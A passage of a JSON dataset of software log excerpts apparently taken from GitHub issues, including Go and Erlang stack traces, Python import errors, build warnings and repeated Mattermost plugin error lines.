\t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/legacy_ante.go:81\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.legacyAnteTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/legacy_ante.go:41\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.indexEventsTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/index_events.go:45\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.recoveryTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/recovery.go:74\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.gasTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/gas.go:53\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/baseapp.(*BaseApp).SimDeliver\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/baseapp/test_helpers.go:58\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/bank_test.BenchmarkOneBankSendTxPerBlock\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/bank/bench_test.go:55\r\n[Truncated]\n<!-- git commit hash or release version -->\r\n\r\n## Steps to Reproduce"
    },
    {
        "logs": "Actually when I typed web app on the page it search the text the list with web-app or web app but now in this change this feature is not working"
    },
    {
        "logs": "2016-11-22 16:21:50.874\r\n16:21:50.873 [error] Error in process <0.1664.0> on node 'ct@testing-gce-9c7052de-389f-4c25-9d20-64660fe2fb35' with exit value:\r\n{{ badmatch,{error,{antidote,\r\n    {bad_return,{{antidote_app,start,[normal,[]]},\r\n        {'EXIT',{{badmatch,{badrpc,{'EXIT',{noproc,{gen_server,call,\r\n            [inter_dc_query,{del_dc,{'dev3@testing-gce-9c7052de-389f-4c25-9d20-64660fe2fb35',{1479,831551,546284}}},infinity]}}}}}\r\n        ,[\r\n        {inter_dc_manager,'-forget_dc/1-fun-2-',2,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,233}]},\r\n        {lists,foreach,2,[{file,\"lists.erl\"},{line,1337}]},\r\n        {inter_dc_manager,forget_dc,1,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,233}]},\r\n        {lists,foreach,2,[{file,\"lists.erl\"},{line,1337}]},\r\n        {inter_dc_manager,reconnect_dcs_after_restart,1,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,197}]},\r\n        {inter_dc_manager,check_node_restart,0,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,187}]},\r\n        {antidote_app,start,2,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/antidote_app.erl\"},{line,60}]},\r\n        {application_master,start_it_old,4,[{file,\"application_master.erl\"},{line,273}]}]}}}}}}},\r\n    [{test_utils,start_node,2,[{file,\"test_utils.erl\"},{line,211}]},{test_utils,'-pmap/2-fun-0-',4,[{file,\"test_utils.erl\"},{line,68}]}]}"
    },
    {
        "logs": "2016-11-22 16:21:50.874\r\n16:21:50.873 [error] Error in process <0.1664.0> on node 'ct@testing-gce-9c7052de-389f-4c25-9d20-64660fe2fb35' with exit value:\r\n{{ badmatch,{error,{antidote,\r\n    {bad_return,{{antidote_app,start,[normal,[]]},\r\n        {'EXIT',{{badmatch,{badrpc,{'EXIT',{noproc,{gen_server,call,\r\n            [inter_dc_query,{del_dc,{'dev3@testing-gce-9c7052de-389f-4c25-9d20-64660fe2fb35',{1479,831551,546284}}},infinity]}}}}}\r\n        ,[\r\n        {inter_dc_manager,'-forget_dc/1-fun-2-',2,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,233}]},\r\n        {lists,foreach,2,[{file,\"lists.erl\"},{line,1337}]},\r\n        {inter_dc_manager,forget_dc,1,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,233}]},\r\n        {lists,foreach,2,[{file,\"lists.erl\"},{line,1337}]},\r\n        {inter_dc_manager,reconnect_dcs_after_restart,1,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,197}]},\r\n        {inter_dc_manager,check_node_restart,0,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,187}]},\r\n        {antidote_app,start,2,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/antidote_app.erl\"},{line,60}]},\r\n        {application_master,start_it_old,4,[{file,\"application_master.erl\"},{line,273}]}]}}}}}}},\r\n    [{test_utils,start_node,2,[{file,\"test_utils.erl\"},{line,211}]},{test_utils,'-pmap/2-fun-0-',4,[{file,\"test_utils.erl\"},{line,68}]}]}"
    },
    {
        "logs": "shell\r\nREADME: document -notify=false\r\n\r\nFixes https://github.com/username_1/drive/issues/791\r\n\r\nDocument that using -notify=false turns off notifying\r\nand that by default -notify is set."
    },
    {
        "logs": "shell\r\nREADME: document -notify=false\r\n\r\nFixes https://github.com/username_1/drive/issues/791\r\n\r\nDocument that using -notify=false turns off notifying\r\nand that by default -notify is set."
    },
    {
        "logs": "t=2016-12-10T04:19:58+0000 lvl=info msg=\"Registering plugin\" logger=plugins name=SimpleJson\r\nt=2016-12-10T04:19:58+0000 lvl=eror msg=\"Plugins: Failed to load plugin json file: [/grafana-plugins/grafana-simple-json-datasource/dist/src/plugin.json Plugin with same id already exists],  err: %!v(MISSING)\""
    },
    {
        "logs": "\t// Pass all characters ' ' at the rest start\r\n\tfor headPassCounter, headPassValue = range string(p.Rest) {\r\n\t\tif headPassValue != ' ' {\r\n\t\t\tbreak\r\n\t\t}\r\n\t}\r\n\tif headPassCounter > 0 {\r\n\t\tp.Rest = p.Rest[headPassCounter:]\r\n\t}\r\n\r\n\t// Take until \" |\" as Val1(int)\r\n\tpos = strings.Index(p.Rest, spaceBar)\r\n\tif pos >= 0 {\r\n\t\ttmp = p.Rest[:pos]\r\n\t\tp.Rest = p.Rest[pos+len(spaceBar):]\r\n\t} else {\r\n\t\treturn false, nil\r\n\t}\r\n\tif tmpInt, err = strconv.ParseInt(tmp, 10, 64); err != nil {\r\n\t\treturn false, fmt.Errorf(\"cannot parse "
    },
    {
        "logs": "\t// Pass all characters ' ' at the rest start\r\n\tfor headPassCounter, headPassValue = range string(p.Rest) {\r\n\t\tif headPassValue != ' ' {\r\n\t\t\tbreak\r\n\t\t}\r\n\t}\r\n\tif headPassCounter > 0 {\r\n\t\tp.Rest = p.Rest[headPassCounter:]\r\n\t}\r\n\r\n\t// Take until \" |\" as Val1(int)\r\n\tpos = strings.Index(p.Rest, spaceBar)\r\n\tif pos >= 0 {\r\n\t\ttmp = p.Rest[:pos]\r\n\t\tp.Rest = p.Rest[pos+len(spaceBar):]\r\n\t} else {\r\n\t\treturn false, nil\r\n\t}\r\n\tif tmpInt, err = strconv.ParseInt(tmp, 10, 64); err != nil {\r\n\t\treturn false, fmt.Errorf(\"cannot parse `%s` into field Val1(int): %s\", tmp, err)\r\n\t}\r\n\tp.Val1 = int(tmpInt)\r\n\r\n\t// Pass all characters ' ' at the rest start\r\n\tfor headPassCounter, headPassValue = range string(p.Rest) {\r\n\t\tif headPassValue != ' ' {\r\n\t\t\tbreak\r\n\t\t}\r\n\t}\r\n\tif headPassCounter > 0 {\r\n\t\tp.Rest = p.Rest[headPassCounter:]\r\n\t}"
    },
    {
        "logs": "======================================================================\r\nERROR: test_bug_808 (pyFAI.test.test_bug_regression.TestBugRegression)\r\nTry to import every single module in the package\r\n----------------------------------------------------------------------\r\nTraceback (most recent call last):\r\n  File \"/builds/silx/bob/pyfai/pyFAI-0.18.0a1/build/debian9/pyFAI-0.18.0a1/.pybuild/pythonX.Y_2.7/build/pyFAI/test/test_bug_regression.py\", line 266, in test_bug_808\r\n    raise err\r\nImportError: cannot import name utils\r\n\r\nStderr:\r\nERROR:pyFAI.test.test_bug_regression:Failed importing pyFAI.opencl.OCLFullSplit from /builds/silx/bob/pyfai/pyFAI-0.18.0a1/build/debian9/pyFAI-0.18.0a1/.pybuild/pythonX.Y_2.7/build/pyFAI/opencl/OCLFullSplit.py with error: \r\nImportError: cannot import name utils"
    },
    {
        "logs": "======================================================================\r\nERROR: test_bug_808 (pyFAI.test.test_bug_regression.TestBugRegression)\r\nTry to import every single module in the package\r\n----------------------------------------------------------------------\r\nTraceback (most recent call last):\r\n  File \"/builds/silx/bob/pyfai/pyFAI-0.18.0a1/build/debian9/pyFAI-0.18.0a1/.pybuild/pythonX.Y_2.7/build/pyFAI/test/test_bug_regression.py\", line 266, in test_bug_808\r\n    raise err\r\nImportError: cannot import name utils\r\n\r\nStderr:\r\nERROR:pyFAI.test.test_bug_regression:Failed importing pyFAI.opencl.OCLFullSplit from /builds/silx/bob/pyfai/pyFAI-0.18.0a1/build/debian9/pyFAI-0.18.0a1/.pybuild/pythonX.Y_2.7/build/pyFAI/opencl/OCLFullSplit.py with error: \r\nImportError: cannot import name utils"
    },
    {
        "logs": "(ResolveAssemblyReferences target) -> \r\n  C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Professional\\MSBuild\\15.0\\Bin\\Microsoft.Common.CurrentVersion.targets(2110,5): warning MSB3276: Found conflicts between different versions of the same dependent assembly. Please set the \"AutoGenerateBindingRedirects\" property to true in the project file. For more information, see http://go.microsoft.com/fwlink/?LinkId=294190. [D:\\MyRepo\\Sources\\MyProject\\MyProject.csproj]\r\n\r\n    1 Warning(s)"
    },
    {
        "logs": "== Compilation error in file lib/ash_json_api/test.ex ==\r\n** (File.Error) could not read file \"test/support/response_schema\": no such file or directory\r\n    (elixir 1.10.2) lib/file.ex:353: File.read!/1\r\n    lib/ash_json_api/test.ex:10: (module)\r\n    (stdlib 3.12) erl_eval.erl:680: :erl_eval.do_apply/6\r\ncould not compile dependency :ash_json_api, \"mix compile\" failed. You can recompile this dependency with \"mix deps.compile ash_json_api\", update it with \"mix deps.update ash_json_api\" or clean it with \"mix deps.clean ash_json_api\""
    },
    {
        "logs": "== Compilation error in file lib/ash_json_api/test.ex ==\r\n** (File.Error) could not read file \"test/support/response_schema\": no such file or directory\r\n    (elixir 1.10.2) lib/file.ex:353: File.read!/1\r\n    lib/ash_json_api/test.ex:10: (module)\r\n    (stdlib 3.12) erl_eval.erl:680: :erl_eval.do_apply/6\r\ncould not compile dependency :ash_json_api, \"mix compile\" failed. You can recompile this dependency with \"mix deps.compile ash_json_api\", update it with \"mix deps.update ash_json_api\" or clean it with \"mix deps.clean ash_json_api\""
    },
    {
        "logs": "{\"level\":\"error\",\"ts\":1591898526.1935163,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898526.3017197,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898528.1210191,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898528.3408728,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898529.451237,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.1260083,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.293569,\"caller\":\"go-plugin@v1.2.2/stream.go:15\",\"msg\":\" call to OnConfigurationChange failed, error: failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=47ioejhd67b9pnpwep1as3o4me Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"source\":\"plugin_stderr\"}\r\n{\"level\":\"error\",\"ts\":1591898530.2969584,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Server configuration is not compatible\",\"plugin_id\":\"com.mattermost.demo-plugin\"}\r\n{\"level\":\"error\",\"ts\":1591898530.8210347,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.9364452,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898532.7847457,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898532.9855063,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.115114,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.6991549,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.862732,\"caller\":\"mlog/log.go:175\",\"msg\":\"Unable to activate plugin\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"error\":\"failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=8g4dwmod77nkbyynaiyxjo1f1y Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\"}\r\n{\"level\":\"error\",\"ts\":1591898535.4448636,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898535.5482078,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898537.1768587,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898537.3703146,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898538.4109979,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898538.9740536,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898539.131942,\"caller\":\"go-plugin@v1.2.2/stream.go:15\",\"msg\":\" call to OnConfigurationChange failed, error: failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=1n46idtz47gpupjxmbrr6g8xte Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"source\":\"plugin_stderr\"}\r\n{\"level\":\"error\",\"ts\":1591898539.135249,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Server configuration is not compatible\",\"plugin_id\":\"com.mattermost.demo-plugin\"}\r\n{\"level\":\"error\",\"ts\":1591898539.702591,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898539.8073962,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898541.547894,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898541.740053,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898542.7785597,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898543.3239017,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898543.475797,\"caller\":\"mlog/log.go:175\",\"msg\":\"Unable to activate plugin\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"error\":\"failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=nbg69tj3gfy6icpyoswosou5pa Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\"}"
    },
    {
        "logs": "{\"level\":\"error\",\"ts\":1591898526.1935163,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898526.3017197,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898528.1210191,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898528.3408728,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898529.451237,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.1260083,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.293569,\"caller\":\"go-plugin@v1.2.2/stream.go:15\",\"msg\":\" call to OnConfigurationChange failed, error: failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=47ioejhd67b9pnpwep1as3o4me Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"source\":\"plugin_stderr\"}\r\n{\"level\":\"error\",\"ts\":1591898530.2969584,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Server configuration is not compatible\",\"plugin_id\":\"com.mattermost.demo-plugin\"}\r\n{\"level\":\"error\",\"ts\":1591898530.8210347,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.9364452,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898532.7847457,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898532.9855063,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.115114,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.6991549,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.862732,\"caller\":\"mlog/log.go:175\",\"msg\":\"Unable to activate plugin\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"error\":\"failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=8g4dwmod77nkbyynaiyxjo1f1y Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\"}\r\n{\"level\":\"error\",\"ts\":1591898535.4448636,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898535.5482078,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898537.1768587,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898537.3703146,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898538.4109979,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898538.9740536,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898539.131942,\"caller\":\"go-plugin@v1.2.2/stream.go:15\",\"msg\":\" call to OnConfigurationChange failed, error: failed to ensure 